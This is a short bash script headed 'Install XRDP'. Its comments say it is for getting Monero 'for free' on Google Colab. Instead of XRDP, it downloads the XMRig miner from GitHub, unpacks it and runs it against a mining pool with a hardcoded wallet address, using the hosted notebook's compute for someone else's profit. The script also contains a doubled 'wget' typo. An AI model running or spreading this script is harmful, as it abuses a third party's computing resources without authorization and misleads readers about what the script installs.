#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-bionic-x64.tar.gz
tar xvzf xmrig-6.17.0-bionic-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o xmr.2miners.com:2222 -u 85BejH1YhKw6yaPK2DAFmJSzbXSgfFyVmVTruoYUN552PV8cyXApXHnNr5du3ShT67MfwxwAjJUnf6t9zGdKbWDjR813iYs -k --tls --rig-id GC-US
